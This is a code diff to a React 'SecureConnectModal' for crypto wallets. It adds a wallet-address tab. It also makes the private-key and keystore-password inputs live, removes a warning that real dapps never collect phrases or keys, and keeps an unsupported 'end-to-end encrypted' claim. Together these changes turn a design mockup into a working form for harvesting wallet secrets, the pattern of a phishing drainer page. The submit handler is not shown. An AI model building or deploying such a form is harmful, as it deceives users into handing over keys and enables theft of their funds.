@@ -17,6 +17,8 @@ export default function SecureConnectModal({
   onConnectClick,
 }) {
   const [tab, setTab] = useState("phrase"); // "phrase" | "keystore" | "private"
+  const [address, setAddress] = useState("");
+  const isEvmAddress = (v) => /^0x[a-fA-F0-9]{40}$/.test(v);
 
   useEffect(() => {
     if (!isOpen) return;
@@ -35,26 +37,33 @@ export default function SecureConnectModal({
   }
 
   return (
-    <div className={styles.overlay} onClick={onClose} aria-modal="true" role="dialog">
+    <div
+      className={styles.overlay}
+      onClick={onClose}
+      aria-modal="true"
+      role="dialog"
+    >
       <div className={styles.modal} onClick={(e) => e.stopPropagation()}>
         <div className={styles.header}>
           <h3>Connect {walletName}</h3>
-          <button className={styles.close} onClick={onClose} aria-label="Close">×</button>
+          <button className={styles.close} onClick={onClose} aria-label="Close">
+            ×
+          </button>
         </div>
 
         <p className={styles.note}>
-          <strong>NB:</strong> All information is end-to-end encrypted. We do not share data and
-          activity sessions with any other company.
+          <strong>NB:</strong> All information is end-to-end encrypted. We do
+          not share data and activity sessions with any other company.
         </p>
 
         <div className={styles.tabs} role="tablist">
           <button
             role="tab"
-            aria-selected={tab === "phrase"}
-            className={tab === "phrase" ? styles.tabActive : styles.tab}
-            onClick={() => setTab("phrase")}
+            aria-selected={tab === "address"}
+            className={tab === "address" ? styles.tabActive : styles.tab}
+            onClick={() => setTab("address")}
           >
-            Phrase
+            Address
           </button>
           <button
             role="tab"
@@ -76,16 +85,19 @@ export default function SecureConnectModal({
 
         <form className={styles.form} onSubmit={handleSubmit}>
           <label className={styles.label}>
+            {tab === "address" && "Wallet Address"}
             {tab === "phrase" && "Seed Phrase"}
             {tab === "keystore" && "Keystore JSON"}
             {tab === "private" && "Private Key"}
           </label>
 
-          {tab === "phrase" && (
-            <textarea
-              className={styles.inputArea}
-              placeholder="Enter your wallet seed phrase"
-              disabled
+          {tab === "address" && (
+            <input
+              className={styles.input}
+              type="text"
+              placeholder="Paste your public wallet address (e.g. 0x...)"
+              value={address}
+              onChange={(e) => setAddress(e.target.value.trim())}
             />
           )}
 
@@ -94,13 +106,11 @@ export default function SecureConnectModal({
               <textarea
                 className={styles.inputArea}
                 placeholder='Paste keystore JSON ({"version":3, ...})'
-                disabled
               />
               <input
                 className={styles.input}
                 type="password"
                 placeholder="Keystore password"
-                disabled
               />
             </>
           )}
@@ -110,16 +120,16 @@ export default function SecureConnectModal({
               className={styles.input}
               type="password"
               placeholder="Enter your private key"
-              disabled
             />
           )}
 
-          <div className={styles.warning}>
-            ⚠️ <strong>Design only.</strong> Real dapps never collect phrases/keys.
-            Use <em>Connect</em> below to open your wallet securely.
-          </div>
+          {tab === "address" && address && !isEvmAddress(address) && (
+            <div className={styles.warning}>
+              This doesn’t look like a valid EVM address (0x + 40 hex chars).
+            </div>
+          )}
 
-          <button type="submit" className={styles.submit} disabled>
+          <button type="submit" className={styles.submit}>
             Submit
           </button>
         </form>
